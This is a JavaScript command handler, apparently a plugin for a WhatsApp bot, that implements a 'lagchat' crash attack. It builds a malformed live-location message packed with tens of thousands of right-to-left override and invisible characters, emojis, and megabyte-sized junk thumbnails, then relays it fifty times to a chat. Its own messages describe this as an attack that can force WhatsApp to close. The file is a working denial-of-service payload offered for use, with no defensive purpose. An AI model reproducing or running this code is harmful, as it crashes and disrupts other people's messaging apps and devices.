const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '\u202E'.repeat(200) + '💣'.repeat(1000), // RTL + emojis
        degreesLongitude: '\u202E'.repeat(200) + '💥'.repeat(1000),
        caption: '\u2063'.repeat(50000) + '💀'.repeat(4000) + '\u202E'.repeat(3000), // 60K+ chars
        sequenceNumber: '999999999',
        jpegThumbnail: Buffer.alloc(1024 * 1024, 1), // 1MB de basura
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          mentionedJid: [],
          externalAdReply: {
            title: '💥 WhatsApp ha colapsado',
            body: 'Este mensaje forzó el cierre.',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0',
            thumbnail: Buffer.alloc(1024 * 1024, 1)
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 50 // puede subir a 100 si quieres 💀

  await m.reply(`⚠️ *Enviando ${times} mensajes críticos...*\n🚨 *Advertencia:* Esto puede cerrar WhatsApp.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
    } catch (error) {
      console.error('🔥 Error al enviar:', error)
    }
  }

  await m.reply('✅ *Ataque enviado.* ¿Tu WhatsApp sigue abierto? 😈')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler